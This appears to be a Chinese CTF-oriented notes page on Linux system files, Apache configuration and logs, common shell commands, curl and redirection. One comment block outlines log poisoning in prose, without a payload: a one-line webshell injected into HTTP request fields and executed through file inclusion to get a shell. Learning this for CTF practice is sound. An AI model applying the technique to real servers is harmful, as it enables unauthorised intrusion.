+<h6 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="&#x2F;etc&#x2F;shadow"></a>&#x2F;etc&#x2F;shadow</h6><p>用于存储 Linux 系统中用户的密码信息,被称为’影子文件‘</p>
+<p>在安装了影子口令软件的系统上的影子口令文件.影子口令文件将&#x2F;etc&#x2F;passwd 文件中的加密口令移动到&#x2F;etc&#x2F;shadow中，而后者只对root可读.这使破译口令更困难.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026222757599-1024x83.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 每个字段含义：</span><br><span class="line"> 用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br></pre></td></tr></table></figure>
+
+<p>对于<strong>加密密码</strong>：</p>
+<p>这里保存的是真正加密的密码。目前 Linux 的密码采用的是 <strong>SHA512</strong> 散列加密算法，原来采用的是 MD5 或 DES 加密算法。SHA512 散列加密算法的加密等级更高，也更加安全。</p>
+<h6 id="etc-hosts"><a href="#etc-hosts" class="headerlink" title="&#x2F;etc&#x2F;hosts"></a>&#x2F;etc&#x2F;hosts</h6><p>hosts文件是linux系统中负责<strong>ip地址与域名快速解析</strong>的文件（和Windows是一样的捏）</p>
+<p>hosts文件包含了ip地址和主机名之间的映射，包括主机名的别名，在没有域名服务器的情况下，系统上的所有网络程序都通过查询该文件来解析对应于某个主机名的ip地址，否则就需要使用DNS服务程序来解决。通常可以将常用的域名和ip地址映射加入到hosts文件中，实现快速方便的访问 优先级：dns缓存&gt;hosts&gt;dns服务</p>
+<p><strong>格式</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ip地址 主机名/域名 （主机别名）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026225531886-1024x80.png"></p>
+<h4 id="web服务器重要文件"><a href="#web服务器重要文件" class="headerlink" title="web服务器重要文件"></a>web服务器重要文件</h4><h6 id="apache"><a href="#apache" class="headerlink" title="apache"></a><strong>apache</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/etc/apache2</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027192501209-1024x398.png" style="zoom:67%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/etc/apcche2/apache2.conf  -&gt;配置文件</span><br></pre></td></tr></table></figure>
+
+<p>apache2.conf是个主配置文件，当apache2服务器启动时，就将零散的配置文件以Including方式组合在一起。看到这，你就应该知道了，这个文件不是真正的具体配置文件，它只是把各个零散的配置文件以inluceding方式包含进来。apache2.conf其实就是负责调用其他配置文件的。</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027192850010.png" style="zoom:50%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/etc/apche2/ports.conf  -&gt;端口配置</span><br></pre></td></tr></table></figure>
+
+<p>ports.cnf记录了服务器使用的端口号，默认监听Listen80，建立自己的网站需要在这里添加网站的端口号，否则无法访问。</p>
+<p>&lt;IfModule ssl_module&gt; Listen 443 </IfModule> 表示当ssl_module启动时，进行443端口的监听。</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193104696-1024x429.png" style="zoom:50%;" />
+
+<p>sites-enabled是apache2<strong>正在使用的网站配置文件</strong>，sites-available是apache2<strong>可用的网站配置文件</strong>。</p>
+<p>enabled中只有一个000-default.conf快捷方式。availbel中有一个000-default.conf和default-ssl.conf两个文件。</p>
+<p>000-default.conf是<strong>使用http协议网站的默认网站配置文件</strong>，而default-ss.conf是<strong>https协议网站才使用的默认网站配置文件</strong>。https还需要申请ssl证书。</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193634755-1024x172.png" style="zoom:67%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/etc/apache2/sites-available/000-default.conf  -&gt;使用http协议网站的默认网站配置文件</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193903339-1024x493.png" style="zoom:50%;" />
+
+<p><strong>ServerAdmin</strong>： 设置一个邮件地址，如果服务器有任何问题将发信到这个地址， 这个地址会在服务器产生的某些页面中出现。</p>
+<p><strong>DocumentRoot</strong> 是这个站点的根目录，这样 Apache2 启动时会扫描 &#x2F;etc&#x2F;apache2&#x2F;sites-enabled 中可用的 website 配置并加载。</p>
+<p>当用户访问localhost:80 时，Apache2 就将 default 站点根目录 &#x2F;var&#x2F;www&#x2F;html 下的index.html（或 index.PHP 等，可配置）作为请求的回应返回给浏览器，然后你能欣赏到的就是 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html 这个文件的内容了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/var/www/html   -&gt;  网站根目录</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027200644069-1024x155.png" style="zoom:50%;" />
+
+<p>例如，&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027200821690-1024x406.png" style="zoom: 50%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> # /var/log/apache2  -》日志文件</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027201546949-1024x290.png" style="zoom: 50%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202238355-1-1024x173.png" style="zoom: 67%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202238355-1024x173.png" style="zoom:67%;" />
+
+<p><strong>ip 时间 请求方式&#x2F;请求资源 协议状态码 服务器向客户端发送的字节数 记录从哪个页面链接访问来的（非页面访问则为-） 客户浏览器信息（UA） （请求代理字符串）</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202105222-1024x98.png"></p>
+<p>日志注入(狭义)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> #中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息</span><br><span class="line"> #如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候,日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell</span><br><span class="line"> #比如使用代理工具抓包,在HTTP请求中插入一句话木马,访问日志文件时会执行一句话木马,然后使用蚁剑等工具链接,从而getshell（结合文件包含漏洞）</span><br><span class="line"> url：https://blog.csdn.net/wangyuxiang946/article/details/119832592</span><br></pre></td></tr></table></figure>
+
+<p>补充：<strong>日志文件</strong></p>
+<p>推荐阅读：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/298335887">https://zhuanlan.zhihu.com/p/298335887</a></p>
+<p><strong>作用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 日志文件用于记录linux系统的各种运行信息的文件，相当于linux主机的日记，不同的日志文件记载了不同类型的信息,如Linux内核消息、用户登录事件、程序错误等。. 日志文件对于诊断和解决问题很有帮助，因为linux运行的程序通常把系统的消息和错误写入对应的日志文件，这样系统可以有据可查， 此外,当主机遭受攻击时,日志文件还可以帮助寻找攻击者留下的痕迹。</span><br></pre></td></tr></table></figure>
+
+<p><strong>Linux系统本身和大部分服务器程序的日志文件默认放在&#x2F;var&#x2F;log&#x2F;下</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/v2-a298559e05d7b6be063b84717f6db6f1_1440w.webp" style="zoom: 67%;" />
+
+<p><strong>用户日志：</strong></p>
+<p>存放位置: &#x2F;var&#x2F;og&#x2F;wtmp. &#x2F;var&#x2F;log&#x2F;btmp、 &#x2F;var&#x2F;log&#x2F;lastlog</p>
+<p><strong>查询命令: users、who、w、last、 lastlog、 lastb等</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> users命令:只是简单的输出当前登录的用户名, 每个显示的用户名对应一个会话。</span><br><span class="line"> who命令:报告当前登录到系统的每个用户的信息，包括用户名，终端，登录日期，远程主机</span><br><span class="line"> w命令： 显示当前操作系统的每个用户及其远程所运行的进程信息</span><br><span class="line"> last命令:用于查询成功登录到系统的用户记录,最近的登录情况在最前面。 通过last命令可以及时掌握Linux主机的登录情况,若发现未经授权的用户登陆过,则表示当前主机可能已被入侵。 </span><br><span class="line"> &#123;</span><br><span class="line"> -a  :把从何处登录系统的主机名称或IP地址,显示在最后一行 </span><br><span class="line"> -d :将IP地址转换成主机名称 </span><br><span class="line"> -f 记录文件</span><br><span class="line"> ] :指定记录文件 </span><br><span class="line"> -R  :不显示登入系统的主机名称或IP地址 </span><br><span class="line"> -x :显示系统关闭,重新开机,以及执行等级的改变等 </span><br><span class="line"> -n : n代表数字,表示最近n次登录的记录</span><br><span class="line"> &#125;</span><br><span class="line"> lastlog命令:用于显示系统中所有用户最近一次登录信息</span><br><span class="line"> lastb命令:用于显显用户错误的登录列表,此指令可以发现系统的登录异常。如登录的用户名错误,密码不正确等情况都会记录在案,登录失败的情况属于安全事件,因此消失可能有人在尝试破解密码。除了使用lastb命令以外,可以直接从安全日志文件/var/log/secure中获得相关信息。</span><br></pre></td></tr></table></figure>
+
+<p>windows系统下的apache日志目录</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027203802404-1024x713.png" style="zoom:50%;" />
+
+<h6 id="nginx（dd）"><a href="#nginx（dd）" class="headerlink" title="nginx（dd）"></a>nginx（dd）</h6><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h5 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ls:列出目录   &#123;ls -l  -》 ll&#125;</span><br><span class="line"> cd：切换目录   </span><br><span class="line"> pwd：显示当前目录</span><br><span class="line"> mkdir：创建一个新的目录</span><br><span class="line"> rmdir：删除一个空的目录</span><br><span class="line"> cp：复制文件或目录</span><br><span class="line"> rm：移除文件或目录</span><br></pre></td></tr></table></figure>
+
+<h5 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> whoami</span><br></pre></td></tr></table></figure>
+
+<h5 id="查看ip等信息"><a href="#查看ip等信息" class="headerlink" title="查看ip等信息"></a>查看ip等信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ifcinfig        //查询和配置网络接口</span><br><span class="line"> hostname -I  // 显示主机名ip</span><br><span class="line"> ip addr show  //查看ipv4，ipv6地址</span><br></pre></td></tr></table></figure>
+
+<h5 id="显示当前位置路径"><a href="#显示当前位置路径" class="headerlink" title="显示当前位置路径"></a>显示当前位置路径</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   pwd                         //显示当前位置路径</span><br></pre></td></tr></table></figure>
+
+<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> find . -name &quot;*.c&quot;     //将目前目录及其子目录下所有延伸档名是 c 的文件列出来</span><br><span class="line"> find . -type f         //将目前目录其其下子目录中所有一般文件列出</span><br><span class="line"> find . -ctime -20      //将目前目录及其子目录下所有最近 20 天内更新过的文件列出</span><br><span class="line"> find /var/log -type f -mtime +7 -ok rm &#123;&#125; \;     //查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们</span><br><span class="line"> find . -type f -perm 644 -exec ls -l &#123;&#125; \;       //查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件</span><br><span class="line"> find / -type f -size 0 -exec ls -l &#123;&#125; \;         //为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> 参数说明 :</span><br><span class="line"> #判断规则</span><br><span class="line"> find 根据下列规则判断 path 和 expression，在命令列上第一个 - ( ) , ! 之前的部份为 path，之后的是 expression。如果 path 是空字串则使用目前路径，如果 expression 是空字串则使用 -print 为预设 expression。</span><br><span class="line"> #expression</span><br><span class="line"> expression 中可使用的选项有二三十个之多，在此只介绍最常用的部份。</span><br><span class="line"> -mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件</span><br><span class="line"> -amin n : 在过去 n 分钟内被读取过</span><br><span class="line"> -anewer file : 比文件 file 更晚被读取过的文件</span><br><span class="line"> -atime n : 在过去 n 天内被读取过的文件</span><br><span class="line"> -cmin n : 在过去 n 分钟内被修改过</span><br><span class="line"> -cnewer file :比文件 file 更新的文件</span><br><span class="line"> -ctime n : 在过去 n 天内创建的文件</span><br><span class="line"> -mtime n : 在过去 n 天内修改过的文件</span><br><span class="line"> -empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name</span><br><span class="line"> -ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写</span><br><span class="line"> -name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</span><br><span class="line"> -size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。</span><br><span class="line"> #关于文件类型</span><br><span class="line"> -type c : 文件类型是 c 的文件。</span><br><span class="line"> d: 目录</span><br><span class="line"> c: 字型装置文件</span><br><span class="line"> b: 区块装置文件</span><br><span class="line"> p: 具名贮列</span><br><span class="line"> f: 一般文件</span><br><span class="line"> l: 符号连结</span><br><span class="line"> s: socket</span><br><span class="line"> #pid</span><br><span class="line"> -pid n : process id 是 n 的文件</span><br><span class="line"> #分割运算符</span><br><span class="line"> 你可以使用 ( ) 将运算式分隔，并使用下列运算。</span><br><span class="line"> exp1 -and exp2</span><br><span class="line"> ! expr</span><br><span class="line"> -not expr</span><br><span class="line"> exp1 -or exp2</span><br><span class="line"> exp1, exp2</span><br></pre></td></tr></table></figure>
+
+<h5 id="系统信息（-）"><a href="#系统信息（-）" class="headerlink" title="系统信息（*）"></a>系统信息（*）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> uname -a    //可以显示一些重要的系统信息，例如内核名称、主机名、内核版本号、处理器类型之类的信息</span><br><span class="line"> ps -ef         //查看所有正在运行的进程</span><br><span class="line"> ps -aux     //显示所有用户打开的进程,包括无控制终端的进程   其中有其他用户的command</span><br><span class="line"> ping IP        //查看与此IP地址的连接情况</span><br><span class="line"> netstat -an    //查看当前系统端口</span><br><span class="line"> netstat -an  grep 8080     //查看指定端口</span><br></pre></td></tr></table></figure>
+
+<h5 id="解压缩命令"><a href="#解压缩命令" class="headerlink" title="解压缩命令"></a>解压缩命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> # 压缩文件 file1 或目录 dir2 到 test.tar.gz</span><br><span class="line"> tar -zcvf filename.tar.gz file1/dir2</span><br><span class="line"> # 解压 test.tar.gz（将 c 换成 x 即可）</span><br><span class="line"> tar -zxvf test.tar.gz</span><br><span class="line"> # 列出压缩文件的内容</span><br><span class="line"> tar -ztvf test.tar.gz </span><br></pre></td></tr></table></figure>
+
+<p><strong>参数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     -z -&gt; 使用 gzip 来压缩和解压文件</span><br><span class="line">     -v -&gt; --verbose 详细的列出处理的文件</span><br><span class="line">     -f -&gt; --file=ARCHIVE 使用档案文件或设备，这个选项通常是必选的</span><br><span class="line">     -c -&gt; --create 创建一个新的归档（压缩包）</span><br><span class="line">     -x -&gt; 从压缩包中解出文件</span><br></pre></td></tr></table></figure>
+
+<h5 id="计划任务-dd"><a href="#计划任务-dd" class="headerlink" title="计划任务(dd)"></a>计划任务(dd)</h5><p><strong>计划任务主要分为以下两种使用情况:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 1.系统级别的定时任务： 临时文件清理、系统信息采集、日志文件切割</span><br><span class="line"> 2.用户级别的定时任务： 定时向互联网同步时间、定时备份系统配置文件、定时备份数据库的数据</span><br></pre></td></tr></table></figure>
+
+<p><strong>crontab</strong>是Linux用来定期执行程序的命令。</p>
+<p>crond 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> crond主要是做一些周期性的任务，比如: 凌晨3点定时备份数据。比如：11点开启网站抢购接口，12点关闭网站抢购接口。</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong>新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行</p>
+<h5 id="vim编辑"><a href="#vim编辑" class="headerlink" title="vim编辑"></a>vim编辑</h5><p>基本上 vi&#x2F;vim 共分为三种模式，分别是<strong>命令模式（Command mode）</strong>，<strong>输入模式（Insert mode）</strong>和<strong>底线命令模式（Last line mode）</strong>。</p>
+<p><strong>命令模式</strong></p>
+<p>用户刚刚启动 vi&#x2F;vim，便进入了命令模式。此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。</p>
+<p><strong>常见命令</strong></p>
+<ul>
+<li><strong>i</strong> 切换到输入模式，以输入字符。</li>
+<li><strong>x</strong> 删除当前光标所在处的字符。</li>
+<li><strong>:</strong> 切换到底线命令模式，以在最底一行输入命令。</li>
+<li>若要编辑文本，进入命令模式后，按下i，切换到输入模式</li>
+</ul>
+<p><strong>输入模式</strong></p>
+<ul>
+<li><strong>字符按键以及Shift组合</strong>，输入字符</li>
+<li><strong>ENTER</strong>，回车键，换行</li>
+<li><strong>BACK SPACE</strong>，退格键，删除光标前一个字符</li>
+<li><strong>ESC</strong>，退出输入模式，切换到命令模式</li>
+</ul>
+<p>编辑文本主要是现在这个模式，vim比vi升级很多，基本上编辑和一般的文本编辑差不多</p>
+<p><strong>底线命令模式</strong></p>
+<p>在命令模式下按下:（英文冒号）就进入了底线命令模式</p>
+<p>常用命令（忽略冒号）</p>
+<p><code>q</code> ：退出程序</p>
+<p><code>w</code> ：保存文件</p>
+<p>一般编辑过后直接 ：wq 然后回车</p>
+<p>按<strong>ESC</strong>键可随时退出底线命令模式</p>
+<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 重定向(Redirect)就是通过各种方法将各种网络请求重新定个方向转到其它位置（如：网页重定向、域名的重定向、路由选择的变化也是对数据报文经由路径的一种重定向）。</span><br></pre></td></tr></table></figure>
+
+<h3 id="重定向-HTTP-状态码"><a href="#重定向-HTTP-状态码" class="headerlink" title="重定向 HTTP 状态码"></a><strong>重定向 HTTP 状态码</strong></h3><p>和重定向有关的 HTTP 状态码主要是 301、302、303、307、308，最常用的是 301 和 302，可以看看 MDN 官方对它们的解释。</p>
+<p>301 是永久重定向（Moved Permanently）说明请求的资源已经被 <strong>永久</strong> 移动到了由 Location 头部指定的 url 上，是固定的不会再改变，搜索引擎会根据该响应修正。</p>
+<p>而 302 是暂时性转移（Moved Temporarily，或者 Found），表明请求的资源被 <strong>暂时</strong> 移动到了由 Location 头部指定的 URL 上。浏览器会重定向到这个 URL， 但是搜索引擎不会对该资源的链接进行更新。</p>
+<p>虽然 301 和 302 都能够将用户输入的网址 A， 改为重定向后的网址 B，但他们还是有区别的：</p>
+<ul>
+<li>搜索引擎区别：301 表示原地址 A 的资源已被移除，永远无法访问，搜索引擎抓内容时会将网址 A 全部替换为 B；而 302 表示网址 A 还活着，搜索引擎会在抓取网址 B 新内容的同时，保留网址 A 的记录。</li>
+<li>安全性：302 跳转有网站劫持的风险，导致网站被盗用。</li>
+</ul>
+<p>在CTF中，重定向考点在于服务器对有flag的网页进行重定向而无法显示flag。</p>
+<p>解决办法是使用curl命令（curl命令默认不强制重定向）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> #curl是一种命令行工具，作用是发出网络请求，然后得到和提取数据。</span><br><span class="line"> #我们直接在curl命令后加上网址，就可以看到网页源码。</span><br><span class="line"> $ curl www.baidu.com</span><br><span class="line">   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                  Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"> 100  2381  100  2381    0     0  20350      0 --:--:-- --:--:-- --:--:-- 20350&lt;!DOCTYPE html&gt;</span><br><span class="line"> &lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type content=text/html;charset=utf-8&gt;&lt;meta http-equiv=X-UA-Compatible content=IE=Edge&gt;&lt;meta content=always name=referrer&gt;</span><br><span class="line">    ......</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">  &lt;/html&gt;</span><br><span class="line"> #curl 默认是不进行重定向的。如果要进行重定向，我们需要加上-L参数</span><br><span class="line"> curl -L taobao.com</span><br><span class="line"> #加上 -o 参数可以保存网页源代码到本地</span><br><span class="line"> curl -o taobao.txt taobao.com -L</span><br><span class="line"> #加上-i参数可以看到响应报文</span><br><span class="line"> curl -i baidu.com</span><br><span class="line"> $ curl -i baidu.com</span><br><span class="line">   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                  Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"> 100    81  100    81    0     0    627      0 --:--:-- --:--:-- --:--:--   627HTTP/1.1 200 OK</span><br><span class="line"> Server:</span><br><span class="line"> Date: Wed, 25 Mar 2020 16:00:02 GMT</span><br><span class="line"> Content-Type: text/html</span><br><span class="line"> Content-Length: 81</span><br><span class="line"> Connection: keep-alive</span><br><span class="line"> Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT</span><br><span class="line"> ETag: &quot;51-47cf7e6ee8400&quot;</span><br><span class="line"> Accept-Ranges: bytes</span><br><span class="line"> ​</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.baidu.com/&quot;&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="linux中重定向"><a href="#linux中重定向" class="headerlink" title="linux中重定向"></a>linux中重定向</h3><p>重定向指用户用文件代替标准输入，标准输出，标准错误输出</p>
+<p>注：Linux 中标准的输入设备默认指的是键盘，标准的输出设备默认指的是显示器。</p>
+<p>方式</p>
+<p>代码</p>
+<p>运算符</p>
+<p>标准输入（stdin)</p>
+<p>0</p>
+<p>&lt; or &lt;&lt;</p>
+<p>标准输出（stdout）</p>
+<p>1</p>
+<p>&gt; or &gt;&gt;</p>
+<p>标准错误输出（stderr）</p>
+<p>2</p>
+<p>2&gt; or 2&lt;</p>
+<h5 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> #&#123; 默认情况下，cat 命令会接受标准输入设备（键盘）的输入，并显示到控制台，但如果用文件代替键盘作为输入设备，那么该命令会以指定的文件作为输入设备，并将文件中的内容读取并显示到控制台。 &#125;</span><br><span class="line"> e.g:</span><br><span class="line"> 1.cat index.php &gt; index2.php   </span><br><span class="line"> #将index.php的内容放到index2.php（自动创建）中</span><br><span class="line"> ​</span><br><span class="line"> 2.cat &gt; index.php</span><br><span class="line"> ... </span><br><span class="line"> #直接将该内容替换index.php中原有内容</span><br><span class="line"> ​</span><br><span class="line"> 3.cat &gt;&gt; index.php</span><br><span class="line"> ...</span><br><span class="line"> #将该内容加在原内容后面</span><br><span class="line"> ​</span><br><span class="line"> 4.cat &gt; test2.txt &lt; test.txt</span><br><span class="line"> #把test.txt内容加到test2.txt中并输出</span><br></pre></td></tr></table></figure>
+
+<h5 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h5><p>相较于输入重定向，我们使用输出重定向的频率更高。并且，和输入重定向不同的是，输出重定向还可以细分为<strong>标准输出重定向</strong>和<strong>错误输出重定向</strong>两种技术。</p>
+<p>在此基础上，标准输出重定向和错误输出重定向又分别包含<strong>清空写入</strong>和<strong>追加写入</strong>两种模式。因此，对于输出重定向来说，其需要用到的符号以及作用如图。</p>
+<p>命令符号格式</p>
+<p>作用</p>
+<p>命令 &gt; 文件</p>
+<p>将命令执行的<strong>标准输出结果</strong>重定向输出到指定的文件中，如果该文件已包含数据，会清空原有数据，再写入新数据。</p>
+<p>命令 2&gt; 文件</p>
+<p>将命令执行的<strong>错误输出结果</strong>重定向到指定的文件中，如果该文件中已包含数据，会清空原有数据，再写入新数据。</p>
+<p>命令 &gt;&gt; 文件</p>
+<p>将命令执行的标准输出结果重定向输出到指定的文件中，如果该文件已包含数据，新数据将写入到原有内容的后面。</p>
+<p>命令 2&gt;&gt; 文件</p>
+<p>将命令执行的错误输出结果重定向到指定的文件中，如果该文件中已包含数据，新数据将写入到原有内容的后面。</p>
+<p>命令 &gt;&gt; 文件 2&gt;&amp;1 或者 命令 &amp;&gt;&gt; 文件</p>
